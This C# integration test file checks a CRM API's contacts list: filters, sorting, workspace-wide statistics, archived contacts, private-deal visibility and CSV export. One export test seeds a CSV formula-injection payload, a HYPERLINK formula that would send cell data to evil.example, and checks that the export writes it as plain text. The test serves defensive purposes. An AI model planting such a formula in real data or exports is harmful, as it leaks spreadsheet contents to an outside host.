using System.Net;
using System.Text;
using System.Text.Json;
using ACI.Domain.Entities;
using ACI.Domain.Enums;
using ACI.Infrastructure.Persistence;
using ACI.WebApi.Tests.Helpers;
using Microsoft.Extensions.DependencyInjection;
using static ACI.WebApi.Tests.Helpers.Workspaces;

namespace ACI.WebApi.Tests;

/// <summary>
/// The contacts list's filters, order, figures and export cover the whole workspace.
/// </summary>
/// <remarks>
/// The page used to receive twenty contacts and filter, sort, count and export those
/// twenty: "Total Contacts 20" for 640 people, a company filter that missed everyone on a
/// later page, an export of one page. And archived contacts could not be listed at all.
/// </remarks>
public class ContactListOnServerTests
{
    private sealed record Seeded(CustomWebApplicationFactory Factory, HttpClient Owner, Guid OwnerId, Guid Org, Guid CompanyId);

    private static async Task<Seeded> SeedAsync(Action<AppDbContext, Guid, Guid, Guid>? more = null)
    {
        var factory = new CustomWebApplicationFactory();
        var (owner, ownerId) = await SignInAsync(factory, "owner@example.ch");
        var org = await CreateAsync(factory, ownerId, "Pavillon");
        owner.In(org);
        var companyId = Guid.NewGuid();
        using var scope = factory.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
        db.Companies.Add(new Company { Id = companyId, UserId = ownerId, OrganizationId = org, Name = "Hotel Bellevue", CreatedAtUtc = DateTime.UtcNow });
        // Twenty-five people with no company, named so they fill the first pages, then the
        // five at Hotel Bellevue, who sort after all of them.
        for (var i = 0; i < 25; i++)
            db.Contacts.Add(Person(ownerId, org, $"Anna {i:00}", null, DateTime.UtcNow.AddDays(-30)));
        for (var i = 0; i < 5; i++)
            db.Contacts.Add(Person(ownerId, org, $"Zoe {i}", companyId, DateTime.UtcNow.AddDays(-30), phone: "+41 79 000 00 0" + i));
        more?.Invoke(db, ownerId, org, companyId);
        await db.SaveChangesAsync();
        return new Seeded(factory, owner, ownerId, org, companyId);
    }

    private static Contact Person(Guid userId, Guid org, string name, Guid? companyId, DateTime created, string? phone = null, bool archived = false) => new()
    {
        Id = Guid.NewGuid(), UserId = userId, OrganizationId = org, Name = name,
        Email = $"{name.Replace(' ', '.').ToLowerInvariant()}.{Guid.NewGuid():N}@example.ch",
        CompanyId = companyId, Phone = phone, CreatedAtUtc = created, IsArchived = archived,
    };

    private static async Task<JsonElement> GetJson(HttpClient client, string url)
    {
        var res = await client.GetAsync(url);
        var body = await res.Content.ReadAsStringAsync();
        res.StatusCode.Should().Be(HttpStatusCode.OK, $"{url}: {body}");
        return JsonDocument.Parse(body).RootElement.Clone();
    }

    private static string[] Names(JsonElement page) =>
        page.GetProperty("items").EnumerateArray().Select(i => i.GetProperty("name").GetString()!).ToArray();

    [Fact]
    public async Task ACompanyFilterFindsItsContactsOnEveryPage()
    {
        var s = await SeedAsync();
        using var _ = s.Factory;

        var atCompany = await GetJson(s.Owner, $"/api/contacts?page=1&pageSize=20&companyId={s.CompanyId}");
        atCompany.GetProperty("totalCount").GetInt32().Should().Be(5, "all five work there, though none is among the first twenty by name");
        Names(atCompany).Should().OnlyContain(n => n.StartsWith("Zoe"));

        (await GetJson(s.Owner, "/api/contacts?page=1&pageSize=20&hasCompany=true")).GetProperty("totalCount").GetInt32().Should().Be(5);
        var none = await GetJson(s.Owner, "/api/contacts?page=2&pageSize=20&hasCompany=false");
        none.GetProperty("totalCount").GetInt32().Should().Be(25);
        Names(none).Should().HaveCount(5, "the second page of twenty-five");

        var searched = await GetJson(s.Owner, $"/api/contacts?page=1&pageSize=20&companyId={s.CompanyId}&search=zoe 3");
        Names(searched).Should().Equal("Zoe 3");
    }

    [Fact]
    public async Task ArchivedContactsCanBeListedOnTheirOwnOrWithTheRest()
    {
        var s = await SeedAsync((db, user, org, _) =>
        {
            db.Contacts.Add(Person(user, org, "Old Member", null, DateTime.UtcNow.AddYears(-2), archived: true));
            db.Contacts.Add(Person(user, org, "Former Guest", null, DateTime.UtcNow.AddYears(-1), archived: true));
        });
        using var _ = s.Factory;

        (await GetJson(s.Owner, "/api/contacts?pageSize=100")).GetProperty("totalCount").GetInt32().Should().Be(30, "active by default");
        var archived = await GetJson(s.Owner, "/api/contacts?pageSize=100&status=archived");
        Names(archived).Should().BeEquivalentTo(new[] { "Former Guest", "Old Member" });
        archived.GetProperty("items").EnumerateArray().Should().OnlyContain(i => i.GetProperty("isArchived").GetBoolean());
        (await GetJson(s.Owner, "/api/contacts?pageSize=100&status=all")).GetProperty("totalCount").GetInt32().Should().Be(32);
        (await GetJson(s.Owner, "/api/contacts?pageSize=100&includeArchived=true")).GetProperty("totalCount").GetInt32()
            .Should().Be(32, "what older clients send still works");
    }

    [Fact]
    public async Task TheActivityFilterAndTheLastActivityOrderReadEveryContactsActivities()
    {
        var s = await SeedAsync((db, user, org, _) =>
        {
            Guid Add(string name) { var c = Person(user, org, name, null, DateTime.UtcNow.AddDays(-200)); db.Contacts.Add(c); return c.Id; }
            void Log(Guid contact, int daysAgo, Guid? deal = null) => db.Activities.Add(new Activity
            {
                Id = Guid.NewGuid(), UserId = user, OrganizationId = org, Type = "call", Subject = "Call",
                ContactId = contact, DealId = deal, CreatedAtUtc = DateTime.UtcNow.AddDays(-daysAgo),
            });
            var recent = Add("Bea Recent"); Log(recent, 2); Log(recent, 120);
            Log(Add("Carl Older"), 60);
            Log(Add("Dora Quiet"), 100);
            Add("Emil Never");
            // A call on a private deal: only those who may open the deal see it as activity.
            var privateOnly = Add("Fanny Private");
            var deal = new Deal { Id = Guid.NewGuid(), UserId = user, OrganizationId = org, Name = "Private suite", Value = "1000", IsPrivate = true, CreatedAtUtc = DateTime.UtcNow };
            db.Deals.Add(deal);
            Log(privateOnly, 1, deal.Id);
        });
        using var _ = s.Factory;

        var active = Names(await GetJson(s.Owner, "/api/contacts?pageSize=100&activity=recent"));
        active.Should().BeEquivalentTo(new[] { "Bea Recent", "Fanny Private" }, "the owner may open the private deal");

        var quietOnes = Names(await GetJson(s.Owner, "/api/contacts?pageSize=100&activity=quiet"));
        quietOnes.Should().Contain(new[] { "Dora Quiet", "Emil Never" }).And.NotContain(new[] { "Bea Recent", "Carl Older", "Fanny Private" });

        var byActivity = Names(await GetJson(s.Owner, "/api/contacts?pageSize=100&sortBy=lastActivity&sortDir=desc"));
        byActivity.Take(4).Should().Equal("Fanny Private", "Bea Recent", "Carl Older", "Dora Quiet");
        byActivity.Skip(4).Should().NotContain(new[] { "Fanny Private", "Bea Recent", "Carl Older", "Dora Quiet" },
            "never contacted comes last when the most recent come first");

        // A member who cannot open the private deal does not see that call as activity.
        var (member, memberId) = await SignInAsync(s.Factory, "member@example.ch");
        await AddMemberAsync(s.Factory, s.Org, memberId, OrgMemberRole.Member);
        member.In(s.Org);
        Names(await GetJson(member, "/api/contacts?pageSize=100&activity=recent")).Should().Equal("Bea Recent");
    }

    [Fact]
    public async Task TheFiguresCountTheWholeWorkspace()
    {
        var s = await SeedAsync((db, user, org, _) =>
        {
            var fresh = Person(user, org, "New Face", null, DateTime.UtcNow.AddDays(-1));
            db.Contacts.Add(fresh);
            db.Activities.Add(new Activity { Id = Guid.NewGuid(), UserId = user, OrganizationId = org, Type = "note", ContactId = fresh.Id, CreatedAtUtc = DateTime.UtcNow.AddDays(-1) });
            db.Contacts.Add(Person(user, org, "Old Member", null, DateTime.UtcNow.AddYears(-2), archived: true));
        });
        using var _ = s.Factory;

        var stats = await GetJson(s.Owner, "/api/contacts/stats");
        stats.GetProperty("total").GetInt32().Should().Be(31, "every active contact, not one page of twenty");
        stats.GetProperty("withCompany").GetInt32().Should().Be(5);
        stats.GetProperty("withPhone").GetInt32().Should().Be(5);
        stats.GetProperty("activeLast30Days").GetInt32().Should().Be(1);
        stats.GetProperty("quietOver90Days").GetInt32().Should().Be(30);
        stats.GetProperty("addedLast7Days").GetInt32().Should().Be(1);
        stats.GetProperty("archived").GetInt32().Should().Be(1);
    }

    [Fact]
    public async Task TheExportHoldsEveryMatchingContact_AndNoCellRunsAsAFormula()
    {
        var s = await SeedAsync((db, user, org, company) =>
            db.Contacts.Add(Person(user, org, "=HYPERLINK(\"http://evil.example/?d=\"&B2,\"Open\")", company, DateTime.UtcNow)));
        using var _ = s.Factory;

        var res = await s.Owner.GetAsync($"/api/contacts/export?companyId={s.CompanyId}&sortBy=name");
        res.StatusCode.Should().Be(HttpStatusCode.OK);
        res.Content.Headers.ContentType!.MediaType.Should().Be("text/csv");
        res.Headers.GetValues("X-Total-Count").Single().Should().Be("6");
        res.Headers.GetValues("X-Exported-Count").Single().Should().Be("6");
        var bytes = await res.Content.ReadAsByteArrayAsync();
        bytes.Take(3).Should().Equal(new byte[] { 0xEF, 0xBB, 0xBF }, "Excel reads the file as UTF-8");
        var lines = Encoding.UTF8.GetString(bytes).TrimStart('﻿').Split("\r\n", StringSplitOptions.RemoveEmptyEntries);
        lines[0].Should().StartWith("Name,Email,Phone,Job title,Company");
        lines.Should().HaveCount(7, "a header and all six contacts at the company, not one page");
        lines.Skip(1).Should().OnlyContain(l => l.Contains("Hotel Bellevue"));
        lines.Should().Contain(l => l.StartsWith("\"'=HYPERLINK("), "a cell that starts with = is written as text");
    }

    [SqlServerFact]
    public async Task OnSqlServer_TheListIsFilteredSortedCountedAndExportedInSql()
    {
        await SqlServerApp.WaitForServerAsync();
        var database = await SqlServerApp.NewDatabaseAsync();
        try
        {
            using var app = SqlServerApp.Start(database);
            var (owner, ownerId) = await SignInAsync(app, $"{Guid.NewGuid():N}@example.com");
            var created = await owner.PostAsync("/api/organizations", Body(new { name = "Pavillon" }));
            created.StatusCode.Should().Be(HttpStatusCode.Created, await created.Content.ReadAsStringAsync());
            var org = JsonDocument.Parse(await created.Content.ReadAsStringAsync()).RootElement.GetProperty("id").GetGuid();
            owner.In(org);
            var companyId = Guid.NewGuid();
            using (var scope = app.Services.CreateScope())
            {
                var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
                db.Companies.Add(new Company { Id = companyId, UserId = ownerId, OrganizationId = org, Name = "Hotel Bellevue", CreatedAtUtc = DateTime.UtcNow });
                var deal = new Deal { Id = Guid.NewGuid(), UserId = ownerId, OrganizationId = org, Name = "Suite", Value = "1000", IsPrivate = true, CreatedAtUtc = DateTime.UtcNow };
                db.Deals.Add(deal);
                for (var i = 0; i < 6; i++)
                {
                    var c = Person(ownerId, org, $"Person {i}", i % 2 == 0 ? companyId : null, DateTime.UtcNow.AddDays(-i * 3), archived: i == 5);
                    db.Contacts.Add(c);
                    if (i < 3)
                        db.Activities.Add(new Activity { Id = Guid.NewGuid(), UserId = ownerId, OrganizationId = org, Type = "call", ContactId = c.Id, DealId = i == 0 ? deal.Id : null, CreatedAtUtc = DateTime.UtcNow.AddDays(-i * 40) });
                }
                await db.SaveChangesAsync();
            }

            Names(await GetJson(owner, "/api/contacts?pageSize=50&activity=recent")).Should().Equal("Person 0");
            Names(await GetJson(owner, "/api/contacts?pageSize=50&activity=quiet")).Should().BeEquivalentTo(new[] { "Person 3", "Person 4" });
            Names(await GetJson(owner, "/api/contacts?pageSize=50&sortBy=lastActivity&sortDir=desc")).Take(3).Should().Equal("Person 0", "Person 1", "Person 2");
            (await GetJson(owner, $"/api/contacts?pageSize=50&companyId={companyId}&status=all")).GetProperty("totalCount").GetInt32().Should().Be(3);
            (await GetJson(owner, "/api/contacts?pageSize=50&hasCompany=false&status=archived")).GetProperty("totalCount").GetInt32().Should().Be(1);
            var stats = await GetJson(owner, "/api/contacts/stats");
            stats.GetProperty("total").GetInt32().Should().Be(5);
            stats.GetProperty("activeLast30Days").GetInt32().Should().Be(1);
            stats.GetProperty("archived").GetInt32().Should().Be(1);
            var export = await owner.GetAsync("/api/contacts/export?status=all&sortBy=lastActivity&sortDir=desc");
            export.StatusCode.Should().Be(HttpStatusCode.OK, await export.Content.ReadAsStringAsync());
            export.Headers.GetValues("X-Exported-Count").Single().Should().Be("6");
        }
        finally
        {
            await SqlServerApp.DropDatabaseAsync(database);
        }
    }
}
